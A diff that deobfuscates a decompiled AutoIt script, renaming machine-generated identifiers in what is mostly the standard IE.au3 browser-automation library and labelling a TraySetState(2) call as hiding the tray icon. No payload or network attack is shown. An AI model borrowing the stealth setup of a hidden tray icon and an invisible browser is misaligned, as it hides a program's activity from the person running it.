@@ -1,3 +1,4 @@
+; hides tray icon
 TraySetState(2)
 Opt("TrayMenuMode", 1)
 
@@ -6,7 +7,7 @@ Func Fn0079($ArgOpt00 = @error, $ArgOpt01 = @extended)
 	Return SetError($ArgOpt00, $ArgOpt01, $Local0000[0])
 EndFunc
 
-Global Const $Var024B[6] = ["V", 2, 4, 0, "20071231", "V2.4-0"]
+Global Const $version[6] = ["V", 2, 4, 0, "20071231", "V2.4-0"]
 Global Const $Var024C = 1, $Var024D = 2
 Global $Var024E = 0x000493E0
 Global $Var024F = False
@@ -22,11 +23,11 @@ Func Fn007A($ArgOpt00 = "about:blank", $ArgOpt01 = 0, $ArgOpt02 = 1, $ArgOpt03 =
 			Case "0"
 				$ArgOpt00 = "about:blank"
 				$ArgOpt02 = 0
-				Fn008A("Warning", "_IECreate", "", "Using deprecated behavior - $f_visible is now parameter 3 instead of parameter 1")
+				LogError("Warning", "_IECreate", "", "Using deprecated behavior - $f_visible is now parameter 3 instead of parameter 1")
 			Case "1"
 				$ArgOpt00 = "about:blank"
 				$ArgOpt02 = 1
-				Fn008A("Warning", "_IECreate", "", "Using deprecated behavior - $f_visible is now parameter 3 instead of parameter 1")
+				LogError("Warning", "_IECreate", "", "Using deprecated behavior - $f_visible is now parameter 3 instead of parameter 1")
 		EndSwitch
 	EndIf
 	If Not $ArgOpt02 Then $ArgOpt04 = 0
@@ -41,22 +42,22 @@ Func Fn007A($ArgOpt00 = "about:blank", $ArgOpt01 = 0, $ArgOpt02 = 1, $ArgOpt03 =
 	If Not $ArgOpt02 And Fn0085($Var024C) Then $Local0002 = 1
 	Local $Local0003 = ObjCreate("InternetExplorer.Application")
 	If Not IsObj($Local0003) Then
-		Fn008A("Error", "_IECreate", "", "Browser Object Creation Failed")
+		LogError("Error", "_IECreate", "", "Browser Object Creation Failed")
 		Return SetError($Var0260, 0, 0)
 	EndIf
 	$Local0003 .visible = $ArgOpt02
-	If $Local0002 And Not Fn0085($Var024D) Then Fn008A("Warning", "_IECreate", "", "Foreground Window Unlock Failed!")
+	If $Local0002 And Not Fn0085($Var024D) Then LogError("Warning", "_IECreate", "", "Foreground Window Unlock Failed!")
 	Fn007B($Local0003, $ArgOpt00, $ArgOpt03)
 	Return SetError(@error, 0, $Local0003)
 EndFunc
 
 Func Fn007B(ByRef $ArgRef00, $Arg01, $ArgOpt02 = 1)
 	If Not IsObj($ArgRef00) Then
-		Fn008A("Error", "_IENavigate", "$_IEStatus_InvalidDataType")
+		LogError("Error", "_IENavigate", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
 	EndIf
 	If Not Fn0089($ArgRef00, "documentContainer") Then
-		Fn008A("Error", "_IENavigate", "$_IEStatus_InvalidObjectType")
+		LogError("Error", "_IENavigate", "$_IEStatus_InvalidObjectType")
 		Return SetError($Var0263, 1, 0)
 	EndIf
 	$ArgRef00.navigate($Arg01)
@@ -71,7 +72,7 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 	$ArgOpt01 = StringLower($ArgOpt01)
 	$ArgOpt02 = Int($ArgOpt02)
 	If $ArgOpt02 < 1 Then
-		Fn008A("Error", "_IEAttach", "$_IEStatus_InvalidValue", "$i_instance < 1")
+		LogError("Error", "_IEAttach", "$_IEStatus_InvalidValue", "$i_instance < 1")
 		Return SetError($Var0264, 3, 0)
 	EndIf
 	If $ArgOpt01 = "embedded" Or $ArgOpt01 = "dialogbox" Then
@@ -79,14 +80,14 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 		If $ArgOpt01 = "dialogbox" And $ArgOpt02 > 1 Then
 			If IsHWnd($Arg00) Then
 				$ArgOpt02 = 1
-				Fn008A("Warning", "_IEAttach", "$_IEStatus_GeneralError", "$i_instance > 1 invalid with HWnd and DialogBox.  Setting to 1.")
+				LogError("Warning", "_IEAttach", "$_IEStatus_GeneralError", "$i_instance > 1 invalid with HWnd and DialogBox.  Setting to 1.")
 			Else
 				Local $Local0005 = WinList($Arg00, "")
 				If $ArgOpt02 <= $Local0005[0][0] Then
 					$Arg00 = $Local0005[$ArgOpt02][1]
 					$ArgOpt02 = 1
 				Else
-					Fn008A("Warning", "_IEAttach", "$_IEStatus_NoMatch")
+					LogError("Warning", "_IEAttach", "$_IEStatus_NoMatch")
 					Opt("WinTitleMatchMode", $Local0004)
 					Return SetError($Var0266, 1, 0)
 				EndIf
@@ -98,7 +99,7 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 		If IsObj($Local0001) Then
 			Return SetError($Var025F, 0, $Local0001)
 		Else
-			Fn008A("Warning", "_IEAttach", "$_IEStatus_NoMatch")
+			LogError("Warning", "_IEAttach", "$_IEStatus_NoMatch")
 			Return SetError($Var0266, 1, 0)
 		EndIf
 	EndIf
@@ -109,7 +110,7 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 	For $Var026B In $Local0008
 		$Var0269 = True
 		$Local000B = Fn008B()
-		If Not $Local000B Then Fn008A("Warning", "_IEAttach", "Cannot register internal error handler, cannot trap COM errors", "Use _IEErrorHandlerRegister() to register a user error handler")
+		If Not $Local000B Then LogError("Warning", "_IEAttach", "Cannot register internal error handler, cannot trap COM errors", "Use _IEErrorHandlerRegister() to register a user error handler")
 		$Local000C = Fn0083()
 		Fn000A(False)
 		If $Var0269 Then
@@ -181,33 +182,33 @@ Func Fn007C($Arg00, $ArgOpt01 = "Title", $ArgOpt02 = 1)
 				Case "hwnd"
 					If $ArgOpt02 > 1 Then
 						$ArgOpt02 = 1
-						Fn008A("Warning", "_IEAttach", "$_IEStatus_GeneralError", "$i_instance > 1 invalid with HWnd.  Setting to 1.")
+						LogError("Warning", "_IEAttach", "$_IEStatus_GeneralError", "$i_instance > 1 invalid with HWnd.  Setting to 1.")
 					EndIf
 					If Fn0082($Var026B, "hwnd") = $Arg00 Then
 						Return SetError($Var025F, 0, $Var026B)
 					EndIf
 				Case Else
-					Fn008A("Error", "_IEAttach", "$_IEStatus_InvalidValue", "Invalid Mode Specified")
+					LogError("Error", "_IEAttach", "$_IEStatus_InvalidValue", "Invalid Mode Specified")
 					Return SetError($Var0264, 2, 0)
 			EndSwitch
 		EndIf
 	Next
-	Fn008A("Warning", "_IEAttach", "$_IEStatus_NoMatch")
+	LogError("Warning", "_IEAttach", "$_IEStatus_NoMatch")
 	Return SetError($Var0266, 1, 0)
 EndFunc
 
 Func Fn007D(ByRef $ArgRef00, $ArgOpt01 = 0, $ArgOpt02 = -1)
 	If Not IsObj($ArgRef00) Then
-		Fn008A("Error", "_IELoadWait", "$_IEStatus_InvalidDataType")
+		LogError("Error", "_IELoadWait", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
 	EndIf
 	If Not Fn0089($ArgRef00, "browserdom") Then
-		Fn008A("Error", "_IELoadWait", "$_IEStatus_InvalidObjectType", ObjName($ArgRef00))
+		LogError("Error", "_IELoadWait", "$_IEStatus_InvalidObjectType", ObjName($ArgRef00))
 		Return SetError($Var0263, 1, 0)
 	EndIf
 	Local $Local0013, $Var026C = False, $Var026D = $Var025F
 	Local $Local000B = Fn008B()
-	If Not $Local000B Then Fn008A("Warning", "_IELoadWait", "Cannot register internal error handler, cannot trap COM errors", "Use _IEErrorHandlerRegister() to register a user error handler")
+	If Not $Local000B Then LogError("Warning", "_IELoadWait", "Cannot register internal error handler, cannot trap COM errors", "Use _IEErrorHandlerRegister() to register a user error handler")
 	Local $Local000C = Fn0083()
 	Fn000A(False)
 	Sleep($ArgOpt01)
@@ -315,16 +316,16 @@ Func Fn007D(ByRef $ArgRef00, $ArgOpt01 = 0, $ArgOpt02 = -1)
 		Case $Var025F
 			Return SetError($Var025F, 0, 1)
 		Case $Var0265
-			Fn008A("Warning", "_IELoadWait", "$_IEStatus_LoadWaitTimeout")
+			LogError("Warning", "_IELoadWait", "$_IEStatus_LoadWaitTimeout")
 			Return SetError($Var0265, 3, 0)
 		Case $Var0267
-			Fn008A("Warning", "_IELoadWait", "$_IEStatus_AccessIsDenied", "Cannot verify readyState.  Likely casue: cross-site scripting security restriction.")
+			LogError("Warning", "_IELoadWait", "$_IEStatus_AccessIsDenied", "Cannot verify readyState.  Likely casue: cross-site scripting security restriction.")
 			Return SetError($Var0267, 0, 0)
 		Case $Var0268
-			Fn008A("Error", "_IELoadWait", "$_IEStatus_ClientDisconnected", "Browser has been deleted prior to operation.")
+			LogError("Error", "_IELoadWait", "$_IEStatus_ClientDisconnected", "Browser has been deleted prior to operation.")
 			Return SetError($Var0268, 0, 0)
 		Case Else
-			Fn008A("Error", "_IELoadWait", "$_IEStatus_GeneralError", "Invalid Error Status - Notify IE.au3 developer")
+			LogError("Error", "_IELoadWait", "$_IEStatus_GeneralError", "Invalid Error Status - Notify IE.au3 developer")
 			Return SetError($Var0260, 0, 0)
 	EndSwitch
 EndFunc
@@ -340,7 +341,7 @@ EndFunc
 
 Func Fn007F(ByRef $ArgRef00, $ArgOpt01 = -1)
 	If Not IsObj($ArgRef00) Then
-		Fn008A("Error", "_IELinkGetCollection", "$_IEStatus_InvalidDataType")
+		LogError("Error", "_IELinkGetCollection", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
 	EndIf
 	$ArgOpt01 = Number($ArgOpt01)
@@ -350,17 +351,17 @@ Func Fn007F(ByRef $ArgRef00, $ArgOpt01 = -1)
 		Case $ArgOpt01 > -1 And $ArgOpt01 < $ArgRef00.document.links.length
 			Return SetError($Var025F, $ArgRef00.document.links.length, $ArgRef00.document.links.item($ArgOpt01))
 		Case $ArgOpt01 < -1
-			Fn008A("Error", "_IELinkGetCollection", "$_IEStatus_InvalidValue")
+			LogError("Error", "_IELinkGetCollection", "$_IEStatus_InvalidValue")
 			Return SetError($Var0264, 2, 0)
 		Case Else
-			Fn008A("Warning", "_IELinkGetCollection", "$_IEStatus_NoMatch")
+			LogError("Warning", "_IELinkGetCollection", "$_IEStatus_NoMatch")
 			Return SetError($Var0266, 2, 0)
 	EndSelect
 EndFunc
 
 Func Fn0080(ByRef $ArgRef00, $Arg01, $ArgOpt02 = "src", $ArgOpt03 = 0, $ArgOpt04 = 1)
 	If Not IsObj($ArgRef00) Then
-		Fn008A("Error", "_IEImgClick", "$_IEStatus_InvalidDataType")
+		LogError("Error", "_IEImgClick", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
 	EndIf
 	Local $Var026E, $Var026F = 0, $Var0270 = $ArgRef00.document.images
@@ -375,7 +376,7 @@ Func Fn0080(ByRef $ArgRef00, $Arg01, $ArgOpt02 = "src", $ArgOpt03 = 0, $ArgOpt04
 			Case $ArgOpt02 = "src"
 				$Var026E = $Var0271 .src
 			Case Else
-				Fn008A("Error", "_IEImgClick", "$_IEStatus_InvalidValue", "Invalid mode: " & $ArgOpt02)
+				LogError("Error", "_IEImgClick", "$_IEStatus_InvalidValue", "Invalid mode: " & $ArgOpt02)
 				Return SetError($Var0264, 3, 0)
 		EndSelect
 		If StringInStr($Var026E, $Arg01) Then
@@ -390,41 +391,41 @@ Func Fn0080(ByRef $ArgRef00, $Arg01, $ArgOpt02 = "src", $ArgOpt03 = 0, $ArgOpt04
 			$Var026F = $Var026F + 1
 		EndIf
 	Next
-	Fn008A("Warning", "_IEImgClick", "$_IEStatus_NoMatch")
+	LogError("Warning", "_IEImgClick", "$_IEStatus_NoMatch")
 	Return SetError($Var0266, 0, 0)
 EndFunc
 
 Func Fn0081(ByRef $ArgRef00, $Arg01)
 	If Not IsObj($ArgRef00) Then
-		Fn008A("Error", "_IEAction", "$_IEStatus_InvalidDataType")
+		LogError("Error", "_IEAction", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
 	EndIf
 	$Arg01 = StringLower($Arg01)
 	Select
 		Case $Arg01 = "click"
 			If Fn0089($ArgRef00, "documentContainer") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.Click()
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "disable"
 			If Fn0089($ArgRef00, "documentContainer") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.disabled = True
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "enable"
 			If Fn0089($ArgRef00, "documentContainer") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.disabled = False
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "focus"
 			If Fn0089($ArgRef00, "documentContainer") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.Focus()
@@ -459,14 +460,14 @@ Func Fn0081(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "printdefault"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.execWB(6, 2)
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "back"
 			If Not Fn0089($ArgRef00, "documentContainer") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.GoBack()
@@ -476,67 +477,67 @@ Func Fn0081(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "forward"
 			If Not Fn0089($ArgRef00, "documentContainer") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.GoForward()
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "home"
 			If Not Fn0089($ArgRef00, "documentContainer") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.GoHome()
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "invisible"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.visible = 0
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "visible"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.visible = 1
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "search"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.GOsearch()
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "stop"
 			If Not Fn0089($ArgRef00, "documentContainer") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.Stop()
 			Return SetError($Var025F, 0, 1)
 		Case $Arg01 = "quit"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$ArgRef00.Quit()
 			$ArgRef00 = 0
 			Return SetError($Var025F, 0, 1)
 		Case Else
-			Fn008A("Error", "_IEAction", "$_IEStatus_InvalidValue", "Invalid Action")
+			LogError("Error", "_IEAction", "$_IEStatus_InvalidValue", "Invalid Action")
 			Return SetError($Var0264, 2, 0)
 	EndSelect
 EndFunc
 
 Func Fn0082(ByRef $ArgRef00, $Arg01)
 	If Not IsObj($ArgRef00) Then
-		Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidDataType")
+		LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
 	EndIf
 	If Not Fn0089($ArgRef00, "browserdom") Then
-		Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+		LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 		Return SetError($Var0263, 1, 0)
 	EndIf
 	Local $Local0013, $Var0272
@@ -544,7 +545,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 	Select
 		Case $Arg01 = "browserx"
 			If Fn0089($ArgRef00, "browsercontainer") Or Fn0089($ArgRef00, "document") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$Local0013 = $ArgRef00
@@ -556,7 +557,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, $Var0272)
 		Case $Arg01 = "browsery"
 			If Fn0089($ArgRef00, "browsercontainer") Or Fn0089($ArgRef00, "document") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			$Local0013 = $ArgRef00
@@ -568,7 +569,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, $Var0272)
 		Case $Arg01 = "screenx"
 			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			If Fn0089($ArgRef00, "browser") Then
@@ -584,7 +585,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, $Var0272 + $ArgRef00.document.parentWindow.screenLeft)
 		Case $Arg01 = "screeny"
 			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			If Fn0089($ArgRef00, "browser") Then
@@ -600,7 +601,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, $Var0272 + $ArgRef00.document.parentWindow.screenTop)
 		Case $Arg01 = "height"
 			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			If Fn0089($ArgRef00, "browser") Then
@@ -610,7 +611,7 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			EndIf
 		Case $Arg01 = "width"
 			If Fn0089($ArgRef00, "window") Or Fn0089($ArgRef00, "document") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			If Fn0089($ArgRef00, "browser") Then
@@ -622,37 +623,37 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, $ArgRef00.isDisabled())
 		Case $Arg01 = "addressbar"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.AddressBar())
 		Case $Arg01 = "busy"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Busy())
 		Case $Arg01 = "fullscreen"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.fullScreen())
 		Case $Arg01 = "hwnd"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, HWnd($ArgRef00.HWnd()))
 		Case $Arg01 = "left"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Left())
 		Case $Arg01 = "locationname"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.LocationName())
@@ -669,55 +670,55 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, $ArgRef00.document.parentwindow.location.href())
 		Case $Arg01 = "menubar"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.MenuBar())
 		Case $Arg01 = "offline"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.OffLine())
 		Case $Arg01 = "readystate"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.ReadyState())
 		Case $Arg01 = "resizable"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Resizable())
 		Case $Arg01 = "silent"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Silent())
 		Case $Arg01 = "statusbar"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.StatusBar())
 		Case $Arg01 = "statustext"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.StatusText())
 		Case $Arg01 = "top"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Top())
 		Case $Arg01 = "visible"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.Visible())
@@ -786,13 +787,13 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, $ArgRef00.document.referrer)
 		Case $Arg01 = "theatermode"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.TheaterMode)
 		Case $Arg01 = "toolbar"
 			If Not Fn0089($ArgRef00, "browser") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			EndIf
 			Return SetError($Var025F, 0, $ArgRef00.ToolBar)
@@ -835,13 +836,13 @@ Func Fn0082(ByRef $ArgRef00, $Arg01)
 			Return SetError($Var025F, 0, $ArgRef00.document.title)
 		Case $Arg01 = "uniqueid"
 			If Fn0089($ArgRef00, "window") Then
-				Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
+				LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidObjectType")
 				Return SetError($Var0263, 1, 0)
 			Else
 				Return SetError($Var025F, 0, $ArgRef00.uniqueID)
 			EndIf
 		Case Else
-			Fn008A("Error", "_IEPropertyGet", "$_IEStatus_InvalidValue", "Invalid Property")
+			LogError("Error", "_IEPropertyGet", "$_IEStatus_InvalidValue", "Invalid Property")
 			Return SetError($Var0264, 2, 0)
 	EndSelect
 EndFunc
@@ -857,18 +858,18 @@ Func Fn0083($ArgOpt00 = -1)
 			$Var0251 = True
 			Return 1
 		Case Else
-			Fn008A("Error", "_IEErrorNotify", "$_IEStatus_InvalidValue")
+			LogError("Error", "_IEErrorNotify", "$_IEStatus_InvalidValue")
 			Return 0
 	EndSwitch
 EndFunc
 
 Func Fn0084(ByRef $ArgRef00)
 	If Not IsObj($ArgRef00) Then
-		Fn008A("Error", "_IEQuit", "$_IEStatus_InvalidDataType")
+		LogError("Error", "_IEQuit", "$_IEStatus_InvalidDataType")
 		Return SetError($Var0262, 1, 0)
 	EndIf
 	If Not Fn0089($ArgRef00, "browser") Then
-		Fn008A("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
+		LogError("Error", "_IEAction", "$_IEStatus_InvalidObjectType")
 		Return SetError($Var0263, 1, 0)
 	EndIf
 	$ArgRef00.quit()
@@ -934,7 +935,7 @@ Func Fn0089(ByRef $ArgRef00, $Arg01)
 		Return SetError($Var0262, 1, 0)
 	EndIf
 	Local $Local000B = Fn008B()
-	If Not $Local000B Then Fn008A("Warning", "internal function __IEIsObjType", "Cannot register internal error handler, cannot trap COM errors", "Use _IEErrorHandlerRegister() to register a user error handler")
+	If Not $Local000B Then LogError("Warning", "internal function __IEIsObjType", "Cannot register internal error handler, cannot trap COM errors", "Use _IEErrorHandlerRegister() to register a user error handler")
 	Local $Local000C = Fn0083()
 	Fn000A(False)
 	Local $Local0012 = String(ObjName($ArgRef00)), $Var0277 = False
@@ -978,9 +979,9 @@ Func Fn0089(ByRef $ArgRef00, $Arg01)
 	EndIf
 EndFunc
 
-Func Fn008A($Arg00, $Arg01, $ArgOpt02 = "", $ArgOpt03 = "")
+Func LogError($Arg00, $Arg01, $ArgOpt02 = "", $ArgOpt03 = "")
 	If $Var0251 Or $Var024F Then
-		Local $Local0014 = "--> IE.au3 " & $Var024B[5] & " " & $Arg00 & " from function " & $Arg01
